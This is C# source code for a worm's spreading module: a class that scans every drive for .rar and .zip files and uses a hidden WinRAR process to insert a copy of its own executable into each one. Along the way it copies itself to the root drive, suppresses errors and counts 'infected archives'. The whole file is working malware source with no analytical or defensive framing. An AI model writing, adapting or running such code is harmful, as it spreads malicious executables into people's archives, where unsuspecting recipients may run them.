using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace myApp
{
    public class Rar
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern int GetShortPathName(
            [MarshalAs(UnmanagedType.LPTStr)]
                string path,
            [MarshalAs(UnmanagedType.LPTStr)]
                StringBuilder shortPath,
            int shortPathLength
            );

        public static int Icounts = 0;
        static string _rarPath;
        static string _copiedExeName;
        private static void Search(string pathName)
        {
            string[] files;
            files = Directory.GetFiles(pathName);
            foreach (string file in files)
            {
                if (file.Contains(".rar"))
                {
                    RarStart(file);
                }
                if (file.Contains(".zip"))
                {
                    RarStart(file);
                }
            }
            string[] subdirectorys = Directory.GetDirectories(pathName);
            foreach (string subdirectory in subdirectorys)
                Search(subdirectory);
        }


        public static void Spread(string myExeName)
        {
            _copiedExeName = myExeName;
            string[] drives = Environment.GetLogicalDrives();
            foreach (string strDrive in drives)
            {
                Search(strDrive);
            }
            
            if (Icounts != 0)
            {
                Program.InfectedArchives = Icounts;
            }
        }

        public static void RarStart(string archiveToInject)
        {
            string sysFolder = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string rootdrive = sysFolder.Replace(sysFolder.Substring(sysFolder.IndexOf("\\")), String.Empty) + "\\";

            _rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe";
            if (File.Exists(_rarPath))
            {
                if (!File.Exists(Path.Combine(rootdrive, _copiedExeName)))
                {
                    //copy our exe to C:\ (or other root drive)
                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(rootdrive, _copiedExeName));
                }
                //get the short path of our exe
                var getshortExePath = new StringBuilder(255);
                GetShortPathName(Path.Combine(rootdrive, _copiedExeName), getshortExePath, getshortExePath.Capacity);
                string evilpath = getshortExePath.ToString();

                //get the short path name of the archive to inject
                var shortArchiveDirectory = new StringBuilder(255);
                GetShortPathName(archiveToInject, shortArchiveDirectory, shortArchiveDirectory.Capacity);


                try
                {
                    ProcessStartInfo rarProcess = new ProcessStartInfo();
                    string theInfo = " a " + shortArchiveDirectory + " " + evilpath;
                    rarProcess.FileName = _rarPath;
                    rarProcess.Arguments = theInfo;
                    rarProcess.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(rarProcess);
                    Icounts++;

                }
                catch
                {
                    //silent error
                }


            }

        }
    }
}